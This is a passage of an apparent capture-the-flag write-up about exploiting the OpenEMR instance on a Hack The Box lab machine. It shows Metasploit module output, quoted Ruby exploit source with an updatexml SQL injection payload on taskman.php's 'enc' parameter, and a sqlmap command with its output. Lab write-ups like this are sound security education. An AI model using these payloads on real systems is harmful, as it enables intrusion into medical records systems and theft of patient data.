</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>size</span><span class=p>:</span> <span class=mi>8193</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>hms</span>                     <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>7850</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>1925</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>159</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>38267</span><span class=o>/</span><span class=mi>38267</span><span class=p>]</span> <span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>911</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>42</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s add this entry in <code>/etc/hosts</code> too.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep hms
</span></span><span class=line><span class=cl>10.10.10.188 hms.htb
</span></span></code></pre></td></tr></table></div></div><p>We are quickly redirected to <a href="http://hms.htb/interface/login/login.php?site=default">http://hms.htb/interface/login/login.php?site=default</a></p><h3 id=http-exploitation-openemr-sqli>HTTP exploitation (OpenEMR): SQLi<a hidden class=anchor aria-hidden=true href=#http-exploitation-openemr-sqli>#</a></h3><p>Its seems we have an openEMR instance.</p><p>There are many exploits but we don&rsquo;t know which version this is.</p><p>Usually I never go to EDB website and only use <code>searchsploit</code>, but this time
we don&rsquo;t know the version used, the only thing we know is that is was a version
probably released in 2018 as the copyright is from 2018.</p><p>By searching on EDB website, we have the date of publication of the exploit.
So with some luck we can begin with the exploits published in 2018.</p><p><a href="https://www.exploit-db.com/search?q=openemr">https://www.exploit-db.com/search?q=openemr</a></p><p>But those two exploits require authentication. No luck.</p><p>So let&rsquo;s see what exploits are also in [Metasploit][msf]:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>msf5</span> <span class=o>&gt;</span> <span class=n>search</span> <span class=n>openemr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Matching</span> <span class=n>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                             Disclosure Date  Rank       Check  Description</span>
</span></span><span class=line><span class=cl>   <span class=o>-</span>  <span class=o>----</span>                                             <span class=o>---------------</span>  <span class=o>----</span>       <span class=o>-----</span>  <span class=o>-----------</span>
</span></span><span class=line><span class=cl>   <span class=mi>0</span>  <span class=n>auxiliary</span><span class=o>/</span><span class=n>sqli</span><span class=o>/</span><span class=n>openemr</span><span class=o>/</span><span class=n>openemr_sqli_dump</span>         <span class=mi>2019</span><span class=o>-</span><span class=mi>05</span><span class=o>-</span><span class=mi>17</span>       <span class=n>normal</span>     <span class=n>Yes</span>    <span class=n>OpenEMR</span> <span class=mf>5.0</span><span class=o>.</span><span class=mi>1</span> <span class=n>Patch</span> <span class=mi>6</span> <span class=n>SQLi</span> <span class=n>Dump</span>
</span></span><span class=line><span class=cl>   <span class=mi>1</span>  <span class=n>exploit</span><span class=o>/</span><span class=n>unix</span><span class=o>/</span><span class=n>webapp</span><span class=o>/</span><span class=n>openemr_sqli_privesc_upload</span>  <span class=mi>2013</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>16</span>       <span class=n>excellent</span>  <span class=n>Yes</span>    <span class=n>OpenEMR</span> <span class=mf>4.1</span><span class=o>.</span><span class=mi>1</span> <span class=n>Patch</span> <span class=mi>14</span> <span class=n>SQLi</span> <span class=n>Privilege</span> <span class=n>Escalation</span> <span class=n>Remote</span> <span class=n>Code</span> <span class=n>Execution</span>
</span></span><span class=line><span class=cl>   <span class=mi>2</span>  <span class=n>exploit</span><span class=o>/</span><span class=n>unix</span><span class=o>/</span><span class=n>webapp</span><span class=o>/</span><span class=n>openemr_upload_exec</span>          <span class=mi>2013</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>13</span>       <span class=n>excellent</span>  <span class=n>Yes</span>    <span class=n>OpenEMR</span> <span class=n>PHP</span> <span class=ne>File</span> <span class=n>Upload</span> <span class=n>Vulnerability</span>
</span></span></code></pre></td></tr></table></div></div><p>The first one seems promising, let&rsquo;s set it up:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options (auxiliary/sqli/openemr/openemr_sqli_dump):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name       Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----       ---------------  --------  -----------
</span></span><span class=line><span class=cl>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span></span><span class=line><span class=cl>   RHOSTS     10.10.10.188     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
</span></span><span class=line><span class=cl>   RPORT      80               yes       The target port (TCP)
</span></span><span class=line><span class=cl>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span></span><span class=line><span class=cl>   TARGETURI  /                yes       The base path to the OpenEMR installation
</span></span><span class=line><span class=cl>   VHOST      hms.htb          no        HTTP server virtual host
</span></span></code></pre></td></tr></table></div></div><p>When we run it we can see the exploit works, but it seems poorly written because
it is trying to dump all system tables (295) and it&rsquo;s pretty slow.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; run
</span></span><span class=line><span class=cl>[*] Running module against 10.10.10.188
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[*] DB Version: 5.7.30-0ubuntu0.18.04.1
</span></span><span class=line><span class=cl>[*] Enumerating tables, this may take a moment...
</span></span><span class=line><span class=cl>[*] Identified 295 tables.
</span></span><span class=line><span class=cl>[*] Dumping table (1/295): CHARACTER_SETS
</span></span><span class=line><span class=cl>[*] Dumping table (2/295): COLLATIONS
</span></span></code></pre></td></tr></table></div></div><p>So let&rsquo;s exit that, the msf module will take hours to extract all those useless
tables.</p><p>Now we know the this SQLi is working let&rsquo;s see what exploit it is exactly:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; info
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       Name: OpenEMR 5.0.1 Patch 6 SQLi Dump
</span></span><span class=line><span class=cl>     Module: auxiliary/sqli/openemr/openemr_sqli_dump
</span></span><span class=line><span class=cl>    License: Metasploit Framework License (BSD)
</span></span><span class=line><span class=cl>       Rank: Normal
</span></span><span class=line><span class=cl>  Disclosed: 2019-05-17
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Provided by:
</span></span><span class=line><span class=cl>  Will Porter &lt;will.porter@lodestonesecurity.com&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Check supported:
</span></span><span class=line><span class=cl>  Yes
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Basic options:
</span></span><span class=line><span class=cl>  Name       Current Setting  Required  Description
</span></span><span class=line><span class=cl>  ----       ---------------  --------  -----------
</span></span><span class=line><span class=cl>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span></span><span class=line><span class=cl>  RHOSTS     10.10.10.188     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
</span></span><span class=line><span class=cl>  RPORT      80               yes       The target port (TCP)
</span></span><span class=line><span class=cl>  SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span></span><span class=line><span class=cl>  TARGETURI  /                yes       The base path to the OpenEMR installation
</span></span><span class=line><span class=cl>  VHOST      hms.htb          no        HTTP server virtual host
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Description:
</span></span><span class=line><span class=cl>  This module exploits a SQLi vulnerability found in OpenEMR version
</span></span><span class=line><span class=cl>  5.0.1 Patch 6 and lower. The vulnerability allows the contents of
</span></span><span class=line><span class=cl>  the entire database (with exception of log and task tables) to be
</span></span><span class=line><span class=cl>  extracted. This module saves each table as a `.csv` file in your
</span></span><span class=line><span class=cl>  loot directory and has been tested with OpenEMR 5.0.1 (3).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>References:
</span></span><span class=line><span class=cl>  https://cvedetails.com/cve/CVE-2018-17179/
</span></span><span class=line><span class=cl>  https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617
</span></span></code></pre></td></tr></table></div></div><p>In metasploit you can use the <code>edit</code> command to open your default editor on
the source code of the module.
By doing that I read the code of the msf module and saw how to detect openEMR
version with method <code>openemr_version</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl> <span class=k>def</span> <span class=nf>openemr_version</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>send_request_cgi</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=s1>&#39;method&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;GET&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s1>&#39;uri&#39;</span> <span class=o>=&gt;</span> <span class=n>normalize_uri</span><span class=p>(</span><span class=n>uri</span><span class=p>,</span> <span class=s1>&#39;admin.php&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vprint_status</span><span class=p>(</span><span class=s2>&#34;admin.php response code: </span><span class=si>#{</span><span class=n>res</span><span class=o>.</span><span class=n>code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>document</span> <span class=o>=</span> <span class=no>Nokogiri</span><span class=o>::</span><span class=no>HTML</span><span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>document</span><span class=o>.</span><span class=n>css</span><span class=p>(</span><span class=s1>&#39;tr&#39;</span><span class=p>)</span><span class=o>[</span><span class=mi>1</span><span class=o>].</span><span class=n>css</span><span class=p>(</span><span class=s1>&#39;td&#39;</span><span class=p>)</span><span class=o>[</span><span class=mi>3</span><span class=o>].</span><span class=n>text</span>
</span></span><span class=line><span class=cl>  <span class=k>rescue</span> <span class=no>StandardError</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>  <span class=k>end</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s just go to <a href=http://hms.htb/admin.php>http://hms.htb/admin.php</a> to check the version installed:</p><p>We have exactly 5.0.1 (3).</p><p>Now by reading <code>get_response</code> method we know which endpoint is requested and
which parameter is vulnerable.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl>  <span class=k>def</span> <span class=nf>get_response</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>send_request_cgi</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=s1>&#39;method&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;GET&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s1>&#39;uri&#39;</span> <span class=o>=&gt;</span> <span class=n>normalize_uri</span><span class=p>(</span><span class=n>uri</span><span class=p>,</span> <span class=s1>&#39;interface&#39;</span><span class=p>,</span> <span class=s1>&#39;forms&#39;</span><span class=p>,</span> <span class=s1>&#39;eye_mag&#39;</span><span class=p>,</span> <span class=s1>&#39;taskman.php&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>      <span class=s1>&#39;vars_get&#39;</span> <span class=o>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;action&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;make_task&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;from_id&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;to_id&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;pid&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;doc_type&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;doc_id&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;enc&#39;</span> <span class=o>=&gt;</span> <span class=s2>&#34;1&#39; and updatexml(1,concat(0x7e, (</span><span class=si>#{</span><span class=n>payload</span><span class=si>}</span><span class=s2>)),0) or &#39;&#34;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span>
</span></span><span class=line><span class=cl>  <span class=k>end</span>
</span></span></code></pre></td></tr></table></div></div><p>Before dumping anything we can verify manually the URL:</p><p>Fine, we can now fire [sqlmap][sqlmap], retrieve DBMS banner:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>sqlmap</span> <span class=o>-</span><span class=n>u</span> <span class=s1>&#39;http://hms.htb/interface/forms/eye_mag/taskman.php?action=make_task&amp;from_id=1&amp;to_id=1&amp;pid=1&amp;doc_type=1&amp;doc_id=1&amp;enc=1&#39;</span> <span class=o>-</span><span class=n>p</span> <span class=n>enc</span> <span class=o>-</span><span class=n>b</span> <span class=o>--</span><span class=n>random</span><span class=o>-</span><span class=n>agent</span>
</span></span><span class=line><span class=cl>        <span class=n>___</span>
</span></span><span class=line><span class=cl>       <span class=n>__H__</span>
</span></span><span class=line><span class=cl> <span class=n>___</span> <span class=n>___</span><span class=p>[(]</span><span class=n>_____</span> <span class=n>___</span> <span class=n>___</span>  <span class=p>{</span><span class=mf>1.4</span><span class=o>.</span><span class=mi>4</span><span class=c1>#stable}</span>
</span></span><span class=line><span class=cl><span class=o>|</span><span class=n>_</span> <span class=o>-|</span> <span class=o>.</span> <span class=p>[</span><span class=o>.</span><span class=p>]</span>     <span class=o>|</span> <span class=o>.</span><span class=s1>&#39;| . |</span>
</span></span><span class=line><span class=cl><span class=o>|</span><span class=n>___</span><span class=o>|</span><span class=n>_</span>  <span class=p>[,]</span><span class=n>_</span><span class=o>|</span><span class=n>_</span><span class=o>|</span><span class=n>_</span><span class=o>|</span><span class=n>__</span><span class=p>,</span><span class=o>|</span>  <span class=n>_</span><span class=o>|</span>
</span></span><span class=line><span class=cl>      <span class=o>|</span><span class=n>_</span><span class=o>|</span><span class=n>V</span><span class=o>...</span>       <span class=o>|</span><span class=n>_</span><span class=o>|</span>   <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>sqlmap</span><span class=o>.</span><span class=n>org</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=n>legal</span> <span class=n>disclaimer</span><span class=p>:</span> <span class=n>Usage</span> <span class=n>of</span> <span class=n>sqlmap</span> <span class=k>for</span> <span class=n>attacking</span> <span class=n>targets</span> <span class=n>without</span> <span class=n>prior</span> <span class=n>mutual</span> <span class=n>consent</span> <span class=n>is</span> <span class=n>illegal</span><span class=o>.</span> <span class=n>It</span> <span class=n>is</span> <span class=n>the</span> <span class=n>end</span> <span class=n>user</span><span class=s1>&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>starting</span> <span class=err>@</span> <span class=mi>21</span><span class=p>:</span><span class=mi>51</span><span class=p>:</span><span class=mi>36</span> <span class=o>/</span><span class=mi>2020</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>14</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>51</span><span class=p>:</span><span class=mi>36</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>fetched</span> <span class=n>random</span> <span class=n>HTTP</span> <span class=n>User</span><span class=o>-</span><span class=n>Agent</span> <span class=n>header</span> <span class=n>value</span> <span class=s1>&#39;Opera/8.51 (X11; Linux i686; U; en)&#39;</span> <span class=n>from</span> <span class=n>file</span> <span class=s1>&#39;/opt/sqlmap/data/txt/user-agents.txt&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>51</span><span class=p>:</span><span class=mi>37</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>testing</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span>
</span></span><span class=line><span class=cl><span class=n>you</span> <span class=n>have</span> <span class=ow>not</span> <span class=n>declared</span> <span class=n>cookie</span><span class=p>(</span><span class=n>s</span><span class=p>),</span> <span class=k>while</span> <span class=n>server</span> <span class=n>wants</span> <span class=n>to</span> <span class=n>set</span> <span class=n>its</span> <span class=n>own</span> <span class=p>(</span><span class=s1>&#39;OpenEMR=b9g6um1rbhc...dmd5cln601&#39;</span><span class=p>)</span><span class=o>.</span> <span class=n>Do</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=n>use</span> <span class=n>those</span> <span class=p>[</span><span class=n>Y</span><span class=o>/</span><span class=n>n</span><span class=p>]</span> <span class=n>n</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>52</span><span class=p>:</span><span class=mi>08</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>previous</span> <span class=n>heuristics</span> <span class=n>detected</span> <span class=n>that</span> <span class=n>the</span> <span class=n>target</span> <span class=n>is</span> <span class=n>protected</span> <span class=n>by</span> <span class=n>some</span> <span class=n>kind</span> <span class=n>of</span> <span class=n>WAF</span><span class=o>/</span><span class=n>IPS</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>52</span><span class=p>:</span><span class=mi>08</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>testing</span> <span class=k>if</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span> <span class=n>content</span> <span class=n>is</span> <span class=n>stable</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>52</span><span class=p>:</span><span class=mi>38</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>connection</span> <span class=n>timed</span> <span class=n>out</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span><span class=o>.</span> <span class=n>sqlmap</span> <span class=n>is</span> <span class=n>going</span> <span class=n>to</span> <span class=n>retry</span> <span class=n>the</span> <span class=n>request</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>54</span><span class=p>:</span><span class=mi>08</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>connection</span> <span class=n>timed</span> <span class=n>out</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>54</span><span class=p>:</span><span class=mi>08</span><span class=p>]</span> <span class=p>[</span><span class=n>WARNING</span><span class=p>]</span> <span class=n>target</span> <span class=n>URL</span> <span class=n>content</span> <span class=n>is</span> <span class=ow>not</span> <span class=n>stable</span> <span class=p>(</span><span class=n>i</span><span class=o>.</span><span class=n>e</span><span class=o>.</span> <span class=n>content</span> <span class=n>differs</span><span class=p>)</span><span class=o>.</span> <span class=n>sqlmap</span> <span class=n>will</span> <span class=n>base</span> <span class=n>the</span> <span class=n>page</span> <span class=n>comparison</span> <span class=n>on</span> <span class=n>a</span> <span class=n>sequence</span> <span class=n>matcher</span><span class=o>.</span> <span class=n>If</span> <span class=n>no</span> <span class=n>dynamic</span> <span class=n>nor</span> <span class=n>injectable</span> <span class=n>parameters</span> <span class=n>are</span> <span class=n>detected</span><span class=p>,</span> <span class=ow>or</span> <span class=ow>in</span> <span class=k>case</span> <span class=n>of</span> <span class=n>junk</span> <span class=n>results</span><span class=p>,</span> <span class=n>refer</span> <span class=n>to</span> <span class=n>user</span><span class=s1>&#39;s manual paragraph &#39;</span><span class=n>Page</span> <span class=n>comparison</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>how</span> <span class=k>do</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=n>proceed</span><span class=err>?</span> <span class=p>[(</span><span class=n>C</span><span class=p>)</span><span class=n>ontinue</span><span class=o>/</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=n>tring</span><span class=o>/</span><span class=p>(</span><span class=n>r</span><span class=p>)</span><span class=n>egex</span><span class=o>/</span><span class=p>(</span><span class=n>q</span><span class=p>)</span><span class=n>uit</span><span class=p>]</span> <span class=n>c</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>54</span><span class=p>:</span><span class=mi>24</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>can</span><span class=s1>&#39;t check dynamic content because of lack of page content</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>54</span><span class=p>:</span><span class=mi>24</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>heuristic</span> <span class=p>(</span><span class=n>basic</span><span class=p>)</span> <span class=n>test</span> <span class=n>shows</span> <span class=n>that</span> <span class=n>GET</span> <span class=n>parameter</span> <span class=s1>&#39;enc&#39;</span> <span class=n>might</span> <span class=n>be</span> <span class=n>injectable</span> <span class=p>(</span><span class=n>possible</span> <span class=n>DBMS</span><span class=p>:</span> <span class=s1>&#39;MySQL&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>54</span><span class=p>:</span><span class=mi>24</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>testing</span> <span class=k>for</span> <span class=n>SQL</span> <span class=n>injection</span> <span class=n>on</span> <span class=n>GET</span> <span class=n>parameter</span> <span class=s1>&#39;enc&#39;</span>
